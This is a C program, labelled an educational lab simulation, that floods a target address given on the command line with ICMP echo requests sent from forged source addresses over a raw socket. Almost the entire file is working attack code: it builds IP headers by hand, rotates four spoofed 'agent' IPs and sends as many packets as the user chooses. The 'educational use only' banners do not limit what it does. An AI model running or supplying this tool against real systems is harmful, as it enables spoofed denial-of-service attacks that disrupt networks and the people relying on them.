#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <time.h>

// Function to calculate checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    
    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int main(int argc, char *argv[]) {
    int raw_socket;
    char packet[4096];
    struct iphdr *ip = (struct iphdr *)packet;
    struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest_addr;
    
    if (argc != 3) {
        printf("Usage: %s <victim_ip> <packet_count>\n", argv[0]);
        printf("Example: %s 10.0.0.2 1000\n", argv[0]);
        printf("WARNING: For educational use only in controlled environments!\n");
        exit(1);
    }
    
    char *victim_ip = argv[1];
    int packet_count = atoi(argv[2]);
    
    printf("========================================\n");
    printf("ICMP Flood Attack Simulation\n");
    printf("Educational Purpose Only - Lab Environment\n");
    printf("========================================\n");
    printf("Victim IP: %s\n", victim_ip);
    printf("Packet Count: %d\n", packet_count);
    printf("ICMP Type: 8 (Echo Request)\n");
    printf("========================================\n\n");
    
    // Create raw socket
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (raw_socket < 0) {
        perror("Socket creation failed");
        exit(1);
    }
    
    // Enable IP_HDRINCL to set IP header manually
    int one = 1;
    const int *val = &one;
    if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Setsockopt failed");
        close(raw_socket);
        exit(1);
    }
    
    // Set destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(victim_ip);
    
    printf("Starting ICMP flood attack simulation...\n");
    printf("Using 4 spoofed agent IPs to send ICMP Echo Requests\n\n");
    
    // Seed random number generator
    srand(time(NULL));
    
    // Define 4 spoofed agent IPs
    char agent_ips[4][20] = {
        "192.168.1.105",
        "192.168.1.106", 
        "192.168.1.107",
        "192.168.1.108"
    };
    
    int packets_sent = 0;
    clock_t start_time = clock();
    
    // Create payload data
    char payload[56] = "ICMP FLOOD ATTACK SIMULATION - EDUCATIONAL USE ONLY";
    
    for (int i = 0; i < packet_count; i++) {
        // Clear packet buffer
        memset(packet, 0, sizeof(packet));
        
        // Select random agent IP for spoofing
        int agent_index = rand() % 4;
        char *spoofed_ip = agent_ips[agent_index];
        
        // Fill IP header
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + strlen(payload));
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 255;
        ip->protocol = IPPROTO_ICMP;
        ip->saddr = inet_addr(spoofed_ip);  // Spoofed source IP
        ip->daddr = inet_addr(victim_ip);   // Victim IP
        ip->check = 0;
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        // Fill ICMP header (Echo Request - Type 8)
        icmp->type = ICMP_ECHO;      // Type 8 = Echo Request
        icmp->code = 0;
        icmp->un.echo.id = htons(rand() % 65535);
        icmp->un.echo.sequence = htons(i);
        icmp->checksum = 0;
        
        // Add payload
        char *icmp_payload = packet + sizeof(struct iphdr) + sizeof(struct icmphdr);
        memcpy(icmp_payload, payload, strlen(payload));
        
        // Calculate ICMP checksum (header + payload)
        int icmp_len = sizeof(struct icmphdr) + strlen(payload);
        icmp->checksum = checksum(icmp, icmp_len);
        
        // Send packet
        if (sendto(raw_socket, packet, ntohs(ip->tot_len), 0, 
                   (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("Send failed");
            break;
        }
        
        packets_sent++;
        
        // Show progress every 100 packets
        if (packets_sent % 100 == 0) {
            printf("Sent %d packets... (Agent: %s)\n", packets_sent, spoofed_ip);
        }
        
        // Small delay to avoid overwhelming
        usleep(1000);  // 1ms delay
    }
    
    clock_t end_time = clock();
    double total_time = ((double)(end_time - start_time)) / CLOCKS_PER_SEC;
    
    printf("\n========================================\n");
    printf("Attack Simulation Completed\n");
    printf("========================================\n");
    printf("Total packets sent: %d\n", packets_sent);
    printf("Time taken: %.2f seconds\n", total_time);
    printf("Packets per second: %.2f\n", packets_sent / total_time);
    printf("ICMP Type: 8 (Echo Request)\n");
    printf("Payload Size: %lu bytes\n", strlen(payload));
    printf("Spoofed agents used:\n");
    for (int i = 0; i < 4; i++) {
        printf("  Agent %d: %s\n", i+1, agent_ips[i]);
    }
    printf("========================================\n");
    printf("Educational simulation complete.\n");
    printf("Check Wireshark to see ICMP flood pattern.\n");
    
    close(raw_socket);
    return 0;
}
